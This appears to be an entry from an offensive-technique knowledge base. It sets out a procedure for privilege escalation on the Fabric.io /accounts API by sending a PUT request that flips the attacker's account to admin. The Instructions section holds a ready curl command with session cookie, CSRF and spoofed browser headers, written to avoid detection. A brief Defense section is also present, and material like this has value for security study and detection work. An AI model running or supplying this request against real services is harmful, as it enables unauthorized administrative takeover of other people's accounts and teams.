---
id: proc-escalate-privileges-update-admin
tags:
  - privilege-escalation
  - authorization-bypass
  - api
type: procedure
tools: []
tactics:
  - '[[Privilege Escalation]]'
commands:
  - '[[commands/put-update-admin-status]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploitation for Privilege Escalation]]'
updated_at: '2025-12-14T17:28:51.535Z'
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Privilege Escalation]]'
mitre_techniques:
  - '[[Exploitation for Privilege Escalation]]'
---
# Escalate-Privileges-by-Updating-Admin-Status

## Summary

This procedure exploits insufficient authorization in the Fabric.io /accounts endpoint by sending a PUT request to set the admin flag to true on the attacker's user account, escalating from member to admin without permission checks.

## Description

The vulnerability stems from the API allowing any authenticated user to update any account's admin status via direct ID targeting, bypassing server-side validation. This occurs in the web API of Fabric.io, using an active session. Prerequisites include the user ID from reconnaissance. Successful execution grants admin privileges, enabling team-wide control like role changes and deletions.

## Requirements

1. Authenticated session as app member with valid CSRF token and session cookie.
2. User ID obtained from prior reconnaissance.
3. App ID (appid) for referer header.
4. Tools like curl or Burp Suite to craft the request with proper headers.

## Defense

Defensive measures and detection strategies:

- Enforce strict authorization checks on /accounts PUT to verify the requester's permissions for the target ID.
- Audit logs for PUT requests to user accounts, alerting on self-updates to admin status.
- Use input validation to reject direct admin flag manipulations.

## Objectives

1. Elevate the attacker's role to admin.
2. Bypass authorization without triggering errors.
3. Enable subsequent admin-only actions.

## Instructions

### Step 1: Prepare the Update Payload

**Context**: Construct the JSON body and headers mimicking a legitimate browser request to avoid detection.

No command; prepare payload: {"admin":true}

### Step 2: Send the PUT Request

**Context**: Target the /accounts endpoint with the user ID and admin payload to trigger escalation.

**Command** ([[commands/put-update-admin-status]]):
```bash
curl -X PUT "https://fabric.io/accounts/54aa4ab19ea6961359001260" \
  -H "Content-Type: application/json; charset=UTF-8" \
  -H "X-CSRF-Token: ..." \
  -H "X-CRASHLYTICS-DEVELOPER-TOKEN: ..." \
  -H "X-Requested-With: XMLHttpRequest" \
  -H "Referer: https://fabric.io/settings/apps/[appid]/team_members" \
  -H "Cookie: _fabric_session=..." \
  -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:34.0) Gecko/20100101 Firefox/34.0" \
  -d '{"admin":true}'
```

> This sends the update request. Replace placeholders with actual values. Expected output: Successful HTTP response (e.g., 200 OK), indicating the update was applied without rejection.

## MITRE ATT&CK Mapping

### Tactics

- [[Privilege Escalation]] Privilege Escalation

### Techniques

- [[Exploitation for Privilege Escalation]] Exploitation for Privilege Escalation

### Sub-Techniques


## Commands Used

- [[commands/put-update-admin-status]]

## Tools Used


## Tags

- privilege-escalation
- authorization-bypass
- api
